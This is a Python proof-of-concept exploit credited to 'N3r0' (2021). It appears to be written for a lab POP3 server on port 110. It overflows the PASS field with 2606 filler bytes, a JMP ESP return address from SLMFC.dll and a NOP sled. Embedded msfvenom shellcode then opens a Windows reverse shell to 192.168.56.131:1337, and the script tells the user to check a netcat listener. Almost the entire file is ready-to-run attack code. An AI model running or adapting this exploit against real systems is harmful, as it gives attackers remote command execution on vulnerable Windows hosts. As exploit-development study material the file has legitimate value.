#!/usr/bin/env python3

import socket
import sys

ip = "192.168.56.133"
port = 110
global s

# 3000 crashes the program
# After sending 2606 characters we will reach the EIP location
# JMP ESP 5F4A358F in SLMFC.dll on Win 7 32bit
# Reverse shell payload:
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.131 EXITFUNC=thread LPORT=1337 -b '\x00\x0a\x0d' -f c
def connect():
	shellcode = (
	"\xba\xb9\xf7\xc9\x53\xd9\xc8\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
	"\x52\x83\xee\xfc\x31\x56\x0e\x03\xef\xf9\x2b\xa6\xf3\xee\x2e"
	"\x49\x0b\xef\x4e\xc3\xee\xde\x4e\xb7\x7b\x70\x7f\xb3\x29\x7d"
	"\xf4\x91\xd9\xf6\x78\x3e\xee\xbf\x37\x18\xc1\x40\x6b\x58\x40"
	"\xc3\x76\x8d\xa2\xfa\xb8\xc0\xa3\x3b\xa4\x29\xf1\x94\xa2\x9c"
	"\xe5\x91\xff\x1c\x8e\xea\xee\x24\x73\xba\x11\x04\x22\xb0\x4b"
	"\x86\xc5\x15\xe0\x8f\xdd\x7a\xcd\x46\x56\x48\xb9\x58\xbe\x80"
	"\x42\xf6\xff\x2c\xb1\x06\x38\x8a\x2a\x7d\x30\xe8\xd7\x86\x87"
	"\x92\x03\x02\x13\x34\xc7\xb4\xff\xc4\x04\x22\x74\xca\xe1\x20"
	"\xd2\xcf\xf4\xe5\x69\xeb\x7d\x08\xbd\x7d\xc5\x2f\x19\x25\x9d"
	"\x4e\x38\x83\x70\x6e\x5a\x6c\x2c\xca\x11\x81\x39\x67\x78\xce"
	"\x8e\x4a\x82\x0e\x99\xdd\xf1\x3c\x06\x76\x9d\x0c\xcf\x50\x5a"
	"\x72\xfa\x25\xf4\x8d\x05\x56\xdd\x49\x51\x06\x75\x7b\xda\xcd"
	"\x85\x84\x0f\x41\xd5\x2a\xe0\x22\x85\x8a\x50\xcb\xcf\x04\x8e"
	"\xeb\xf0\xce\xa7\x86\x0b\x99\x07\xfe\x2b\xda\xe0\xfd\x4b\xd9"
	"\xc9\x88\xad\x8b\x39\xdd\x66\x24\xa3\x44\xfc\xd5\x2c\x53\x79"
	"\xd5\xa7\x50\x7e\x98\x4f\x1c\x6c\x4d\xa0\x6b\xce\xd8\xbf\x41"
	"\x66\x86\x52\x0e\x76\xc1\x4e\x99\x21\x86\xa1\xd0\xa7\x3a\x9b"
	"\x4a\xd5\xc6\x7d\xb4\x5d\x1d\xbe\x3b\x5c\xd0\xfa\x1f\x4e\x2c"
	"\x02\x24\x3a\xe0\x55\xf2\x94\x46\x0c\xb4\x4e\x11\xe3\x1e\x06"
	"\xe4\xcf\xa0\x50\xe9\x05\x57\xbc\x58\xf0\x2e\xc3\x55\x94\xa6"
	"\xbc\x8b\x04\x48\x17\x08\x24\xab\xbd\x65\xcd\x72\x54\xc4\x90"
	"\x84\x83\x0b\xad\x06\x21\xf4\x4a\x16\x40\xf1\x17\x90\xb9\x8b"
	"\x08\x75\xbd\x38\x28\x5c")

	data = "\x41" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 40 + shellcode
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a socket for TCP connection
	s.connect((ip,port)) # Connects to given ip and port by the user
	print(s.recv(1024)) # Prints to the screen the data recieved from the server when established the TCP connection
	s.send(b'USER hacker\r\n')
	print(s.recv(1024))
	print("[%d] bytes has been sended to the target \n" % len(data))
	s.send(bytes('PASS ' + data + '\r\n','latin-1')) # Sends the payload
	s.close()

def main():
	print("----------------------------------------------------------\n")
	print("\tProof Of Concept created by N3r0 (2021)\n")
	print("----------------------------------------------------------\n")
	connect()
	print("Check your netcat listener!\n")

if __name__ == "__main__":
    main()
